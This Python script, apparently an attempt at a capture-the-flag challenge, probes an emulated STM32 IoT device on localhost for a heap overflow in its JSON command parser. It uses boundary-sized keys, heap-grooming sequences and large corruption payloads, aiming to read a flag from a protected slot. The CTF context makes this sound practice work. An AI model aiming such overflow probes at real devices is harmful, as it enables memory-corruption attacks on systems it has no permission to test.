#!/usr/bin/env python3

import json
import socket
import time

def send_command(host, port, cmd_str):
    """Send a raw JSON command string to the emulator"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        
        print(f"Sending raw: {cmd_str[:100]}{'...' if len(cmd_str) > 100 else ''}")
        s.send(cmd_str.encode() + b'\n')
        
        response = s.recv(4096)
        print(f"Response: {response}")
        
        s.close()
        return response
    except Exception as e:
        print(f"Error: {e}")
        return None

def test_json_parsing_overflow():
    """Test for heap overflow in JSON command line parsing"""
    print("=== Testing JSON Parsing Heap Overflow ===")
    
    # The vulnerability might be in the buffer reallocation logic in FUN_08007260
    # Let's try to trigger specific reallocation patterns
    
    base_patterns = [
        # Pattern 1: Trigger multiple reallocations with growing key length
        '"' + 'A' * 16 + '":1,"' + 'B' * 17 + '":2',
        '"' + 'A' * 32 + '":1,"' + 'B' * 33 + '":2', 
        '"' + 'A' * 64 + '":1,"' + 'B' * 65 + '":2',
        
        # Pattern 2: Test the specific size where reallocation logic breaks
        # Based on: iVar6 = uVar10 + 1 where uVar10 = capacity * 2
        '"slot":1,"' + 'x' * 31 + '":"test"',  # Close to boundary
        '"slot":1,"' + 'x' * 32 + '":"test"',  # Exactly at boundary?
        '"slot":1,"' + 'x' * 33 + '":"test"',  # Just over
        '"slot":1,"' + 'x' * 63 + '":"test"',  # Next boundary
        '"slot":1,"' + 'x' * 64 + '":"test"',
        '"slot":1,"' + 'x' * 65 + '":"test"',
    ]
    
    for pattern in base_patterns:
        cmd_str = '{' + pattern + '}'
        result = send_command('localhost', 8000, cmd_str)
        if not result:
            print("Connection closed - possible crash!")
            return True
        time.sleep(0.2)
    
    return False

def test_heap_feng_shui():
    """Try heap feng shui to set up specific heap layout"""
    print("\n=== Testing Heap Layout Manipulation ===")
    
    # Try to create specific heap conditions
    # Send several commands to set up heap layout
    setup_commands = [
        '{"slot":1}',
        '{"slot":2}', 
        '{"slot":3}',
    ]
    
    for cmd in setup_commands:
        send_command('localhost', 8000, cmd)
        time.sleep(0.1)
    
    # Now try overflow after heap is in specific state
    overflow_patterns = [
        '{"slot":1,"' + 'padding' * 20 + '":"' + 'X' * 100 + '"}',
        '{"slot":1,"data":[' + ','.join(['42'] * 200) + ']}',
    ]
    
    for pattern in overflow_patterns:
        result = send_command('localhost', 8000, pattern)
        if not result:
            print("Connection closed during heap manipulation!")
            return True
        time.sleep(0.1)
    
    return False

def test_specific_off_by_one():
    """Test specific off-by-one scenarios based on code analysis"""
    print("\n=== Testing Off-by-One Scenarios ===")
    
    # The reallocation logic: iVar6 = uVar10 + 1 where uVar10 = capacity * 2
    # This might be the off-by-one if the +1 is wrong
    
    # Test patterns that might trigger specific allocation sizes
    critical_sizes = [15, 16, 17, 31, 32, 33, 63, 64, 65, 127, 128, 129]
    
    for size in critical_sizes:
        # Test with slot command
        padding = 'X' * size
        patterns = [
            f'{{"slot":1,"{padding}":"test"}}',
            f'{{"slot":1,"data":[{",".join([str(i % 256) for i in range(size)])}]}}',
        ]
        
        for pattern in patterns:
            print(f"Testing size {size}")
            result = send_command('localhost', 8000, pattern)
            if not result:
                print(f"Connection closed at size {size}!")
                return True
            time.sleep(0.1)
    
    return False

def test_corruption_detection():
    """Send commands that might corrupt memory and then test slot 0 access"""
    print("\n=== Testing Memory Corruption ===")
    
    # Potential corruption payloads
    corruption_payloads = [
        # Try to overflow and write specific values that might bypass the check
        '{"slot":1,"data":[' + ','.join(['0'] * 1000) + ']}',
        
        # Try payloads with specific byte patterns that might corrupt slot number
        '{"slot":1,"' + 'A' * 1000 + '":"' + 'B' * 1000 + '"}',
        
        # Try nested structures that might confuse parsing
        '{"slot":1,"data":{"nested":[' + ','.join(['1'] * 500) + ']}}',
    ]
    
    for i, payload in enumerate(corruption_payloads):
        print(f"Trying corruption payload {i+1}")
        result = send_command('localhost', 8000, payload)
        if not result:
            print("Connection closed during corruption attempt!")
            continue
            
        # After each corruption attempt, try to access slot 0
        print("Testing slot 0 access after corruption attempt...")
        result = send_command('localhost', 8000, '{"slot":0}')
        if result and b'TISC{' in result:
            print("SUCCESS! Memory corruption allowed slot 0 access!")
            return True
        elif not result:
            print("Connection closed when accessing slot 0!")
            
        time.sleep(0.2)
    
    return False

def main():
    print("STM32 IoT Challenge Exploit v2")
    print("Targeting heap overflow vulnerability")
    
    if test_json_parsing_overflow():
        return
        
    if test_heap_feng_shui():
        return
        
    if test_specific_off_by_one():
        return
        
    if test_corruption_detection():
        return
    
    print("All exploit attempts failed. Need deeper analysis.")

if __name__ == "__main__":
    main()